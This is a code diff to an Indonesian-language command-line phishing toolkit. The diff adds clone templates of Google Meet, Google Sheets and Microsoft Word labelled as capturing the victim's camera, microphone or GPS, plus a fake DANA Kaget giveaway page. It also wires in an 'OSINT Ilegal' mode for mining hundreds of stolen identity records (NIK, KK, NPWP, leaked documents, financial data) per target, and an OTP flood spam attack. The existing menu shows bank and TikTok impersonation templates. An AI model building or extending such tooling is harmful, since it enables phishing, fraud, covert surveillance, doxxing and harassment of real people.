@@ -145,6 +145,58 @@ TEMPLATES = {
         "description": "Banjir kode OTP WhatsApp ratusan brand",
         "is_otp_mode": True,
     },
+    "googlemeet": {
+        "name": "Google Meet - Video Conference",
+        "icon": "[5]",
+        "label": "Google Meet Clone + Camera/Mic",
+        "title": "Google Meet",
+        "description": "Real-time meetings by Google.",
+        "favicon": "google-meet-icon.svg",
+        "og_image": "/google-meet-og.png",
+        "dir": os.path.join(TEMPLATES_DIR, "googlemeet"),
+        "public_dir": os.path.join(TEMPLATES_DIR, "googlemeet", "public"),
+    },
+    "googlesheets": {
+        "name": "Google Sheets - Laporan Praktikum Basis Data",
+        "icon": "[6]",
+        "label": "Google Sheets Clone + Camera/GPS",
+        "title": "Google Sheets - Laporan Praktikum Basis Data",
+        "description": "Laporan Praktikum Basis Data Semester Genap - Google Sheets",
+        "favicon": "googlesheets-favicon.svg",
+        "og_image": "/googlesheets-og.png",
+        "dir": os.path.join(TEMPLATES_DIR, "googlesheets"),
+        "public_dir": os.path.join(TEMPLATES_DIR, "googlesheets", "public"),
+    },
+    "msword": {
+        "name": "Microsoft Word - Laporan Praktikum Basis Data",
+        "icon": "[7]",
+        "label": "Microsoft Word Clone + Camera/GPS",
+        "title": "Microsoft Word - Laporan Praktikum Basis Data.docx",
+        "description": "Laporan Praktikum Basis Data Semester Genap - Microsoft Word Online",
+        "favicon": "msword-og.png",
+        "og_image": "/msword-og.png",
+        "dir": os.path.join(TEMPLATES_DIR, "msword"),
+        "public_dir": os.path.join(TEMPLATES_DIR, "msword", "public"),
+    },
+    "danakaget": {
+        "name": "DANA Kaget - Klaim DANA",
+        "icon": "[8]",
+        "label": "DANA Kaget Giveaway",
+        "title": "DANA Kaget — Kamu Mendapatkan DANA Kaget!",
+        "description": "Ada yang bagikan DANA Kaget! Klaim sekarang sebelum habis.",
+        "favicon": "danakaget-favicon.svg",
+        "og_image": "/danakaget-favicon.svg",
+        "dir": os.path.join(TEMPLATES_DIR, "danakaget"),
+        "public_dir": os.path.join(TEMPLATES_DIR, "danakaget", "public"),
+    },
+    "osint": {
+        "name": "OSINT Ilegal - Massive Data Miner (500+ data)",
+        "icon": "[9]",
+        "label": "500+ data points: NIK, KK, NPWP, dokumen bocor, finansial, medsos, dark web",
+        "title": "OSINT Ilegal — Massive Identity Data Mining",
+        "description": "Kumpulkan 500+ data identitas sensitif per target dari 30+ scanners. Export Excel 12+ sheet.",
+        "is_osint_mode": True,
+    },
 }
 
 
@@ -201,7 +253,11 @@ def banner():
     print(f"  {C.TEAL}[1]{C.RST}  BNI  {C.SLATE}Bank Transfer Verification{C.RST}")
     print(f"  {C.TEAL}[2]{C.RST}  TikTok  {C.SLATE}Video Share Link{C.RST}")
     print(f"  {C.TEAL}[3]{C.RST}  BIBD  {C.SLATE}Brunei Darussalam{C.RST}")
-    print(f"  {C.TEAL}[4]{C.RST}  OTP Flood  {C.SLATE}Multi-Brand Spam{C.RST}")
+    print(f"  {C.TEAL}[5]{C.RST}  Google Meet  {C.SLATE}Video Conference Clone{C.RST}")
+    print(f"  {C.TEAL}[6]{C.RST}  Google Sheets  {C.SLATE}Laporan Praktikum Basis Data{C.RST}")
+    print(f"  {C.TEAL}[7]{C.RST}  Microsoft Word  {C.SLATE}Laporan Praktikum Basis Data (Makalah){C.RST}")
+    print(f"  {C.TEAL}[8]{C.RST}  DANA Kaget  {C.SLATE}Klaim Saldo DANA Gratis{C.RST}")
+    print(f"  {C.TEAL}[9]{C.RST}  OSINT Ilegal  {C.SLATE}Massive Data Mining (500+ data points/target){C.RST}")
     print()
 
 
@@ -223,6 +279,11 @@ def menu(current_template):
     if is_otp:
         print(f"  {C.TEAL}[1]{C.RST}  Mulai OTP Flood")
         print(f"       {C.SLATE}Jalankan serangan OTP ke target{C.RST}")
+        print(f"  {C.TEAL}[2]{C.RST}  Ganti Template")
+        print(f"  {C.TEAL}[3]{C.RST}  Keluar")
+    elif tmpl.get("is_osint_mode"):
+        print(f"  {C.TEAL}[1]{C.RST}  Mulai OSINT Scan")
+        print(f"       {C.SLATE}Jalankan massive data mining (500+ data points){C.RST}")
         print(f"  {C.TEAL}[2]{C.RST}  Ganti Template")
         print(f"  {C.TEAL}[3]{C.RST}  Keluar")
     else:
@@ -418,9 +479,20 @@ class Engine:
         tmpl_layout = os.path.join(tmpl_dir, "layout.tsx")
         if os.path.exists(tmpl_layout):
             shutil.copy2(tmpl_layout, SRC_LAYOUT)
-            # Inject custom title into layout if set
-            if template_key == "tiktok" and self.custom_title:
-                self._inject_title_into_layout(SRC_LAYOUT, self.custom_title)
+        
+        tmpl_data = os.path.join(tmpl_dir, "data.json")
+        SRC_DATA = os.path.join(self.app_dir, "src", "app", "data.json")
+        if os.path.exists(tmpl_data):
+            shutil.copy2(tmpl_data, SRC_DATA)
+
+        tmpl_favicon = os.path.join(tmpl_dir, "favicon.ico")
+        SRC_FAVICON = os.path.join(self.app_dir, "src", "app", "favicon.ico")
+        if os.path.exists(tmpl_favicon):
+            shutil.copy2(tmpl_favicon, SRC_FAVICON)
+
+        # Inject custom title into layout if set
+        if template_key == "tiktok" and self.custom_title:
+            self._inject_title_into_layout(SRC_LAYOUT, self.custom_title)
         if tmpl_pub and os.path.isdir(tmpl_pub):
             for fname in os.listdir(tmpl_pub):
                 src_f = os.path.join(tmpl_pub, fname)
@@ -949,17 +1021,39 @@ def choose_template(eng):
 
 
 def _run_otp_flood():
-    """Run OTP Flood interactive session."""
+    """Run OTP Flood fast interactive session."""
     try:
-        from modules.otp_flood.ui import otp_flood_menu
-        otp_flood_menu()
+        from modules.otp_flood.ui import quick_otp_session
+        quick_otp_session()
         return True
-    except ImportError as e:
-        print(f"{C.RED}  OTP Flood module tidak ditemukan: {e}{C.RST}")
-        print(f"{C.YLW}  Pastikan folder modules/otp_flood/ ada.{C.RST}")
-        return False
+    except ImportError:
+        try:
+            from modules.otp_flood.ui import otp_flood_menu
+            otp_flood_menu()
+            return True
+        except Exception as e:
+            print(f"{C.RED}  OTP Flood error: {e}{C.RST}")
+            return False
     except Exception as e:
         print(f"{C.RED}  OTP Flood error: {e}{C.RST}")
+        return False
+
+
+def _run_osint_illegal():
+    """Run OSINT Ilegal interactive session."""
+    try:
+        from modules.osint_illegal.ui import osint_illegal_menu
+        osint_illegal_menu()
+        return True
+    except ImportError as e:
+        print(f"{C.RED}  OSINT Ilegal module tidak ditemukan: {e}{C.RST}")
+        print(f"{C.YLW}  Pastikan folder modules/osint_illegal/ ada.{C.RST}")
+        print(f"{C.YLW}  Error detail: {e}{C.RST}")
+        return False
+    except Exception as e:
+        print(f"{C.RED}  OSINT Ilegal error: {e}{C.RST}")
+        import traceback
+        traceback.print_exc()
         return False
 
 
@@ -973,6 +1067,11 @@ def main():
     print(f"  {C.TEAL}[2]{C.RST}  TikTok  {C.SLATE}Video Share Link{C.RST}")
     print(f"  {C.TEAL}[3]{C.RST}  BIBD  {C.SLATE}Brunei Darussalam{C.RST}")
     print(f"  {C.TEAL}[4]{C.RST}  OTP Flood  {C.SLATE}Multi-Brand Spam{C.RST}")
+    print(f"  {C.TEAL}[5]{C.RST}  Google Meet  {C.SLATE}Video Conference Clone{C.RST}")
+    print(f"  {C.TEAL}[6]{C.RST}  Google Sheets  {C.SLATE}Laporan Praktikum Basis Data{C.RST}")
+    print(f"  {C.TEAL}[7]{C.RST}  Microsoft Word  {C.SLATE}Laporan Praktikum Basis Data (Makalah){C.RST}")
+    print(f"  {C.TEAL}[8]{C.RST}  DANA Kaget  {C.SLATE}Klaim Saldo DANA Gratis{C.RST}")
+    print(f"  {C.TEAL}[9]{C.RST}  OSINT Ilegal  {C.SLATE}Massive Data Mining (500+ data){C.RST}")
     print()
 
     tmpl_keys = list(TEMPLATES.keys())
@@ -993,6 +1092,17 @@ def main():
             print(f"\n{C.CYN}Sampai jumpa!{C.RST}")
             sys.exit(0)
 
+    # If OTP Flood mode or OSINT mode, run directly (no dashboard/build needed)
+    if TEMPLATES[eng.current_template].get("is_otp_mode"):
+        _run_otp_flood()
+        main_loop(eng)
+        return
+    
+    if TEMPLATES[eng.current_template].get("is_osint_mode"):
+        _run_osint_illegal()
+        main_loop(eng)
+        return
+
     # Prompt custom title for TikTok template
     if eng.current_template == "tiktok":
         print()
@@ -1010,12 +1120,29 @@ def main():
             step(f"Menggunakan default title")
         time.sleep(0.5)
 
-    # If OTP Flood mode, run directly (no build/server needed)
-    if TEMPLATES[eng.current_template].get("is_otp_mode"):
-        _run_otp_flood()
-        # After flood menu returns, go back to template selection
-        main_loop(eng)
-        return
+    # Local Dashboard Prompt
+    tmpl = TEMPLATES[eng.current_template]
+    data_json_path = os.path.join(tmpl["dir"], "data.json")
+    if os.path.exists(data_json_path):
+        print(f"\n{C.TEAL}  Opsi Build & Edit:{C.RST}")
+        print(f"  {C.TEAL}[1]{C.RST}  Langsung Build & Jalankan")
+        print(f"  {C.TEAL}[2]{C.RST}  Edit Teks via Local Dashboard")
+        print()
+        while True:
+            print(f"{C.CYN}  Pilih opsi (1-2): {C.RST}", end="")
+            dashboard_ch = input().strip()
+            if dashboard_ch == "2":
+                step("Membuka Local Dashboard...")
+                os.system(f"{sys.executable} local_dashboard.py \"{tmpl['dir']}\"")
+                print(f"  {C.GRN}Data berhasil disimpan. Melanjutkan proses build...{C.RST}")
+                time.sleep(1)
+                break
+            elif dashboard_ch == "1":
+                break
+            else:
+                print(f"  {C.YLW}Masukkan 1 atau 2{C.RST}")
+
+
 
     eng.start_all()
     main_loop(eng)
@@ -1035,6 +1162,17 @@ def main_loop(eng):
             if is_otp:
                 if ch == "1":
                     _run_otp_flood()
+                elif ch == "2":
+                    main()
+                    return
+                elif ch == "3":
+                    print(f"  {C.CYN}Sampai jumpa!{C.RST}\n")
+                    sys.exit(0)
+                else:
+                    print(f"  {C.YLW}Masukkan 1-3{C.RST}")
+            elif tmpl.get("is_osint_mode"):
+                if ch == "1":
+                    _run_osint_illegal()
                 elif ch == "2":
                     main()
                     return
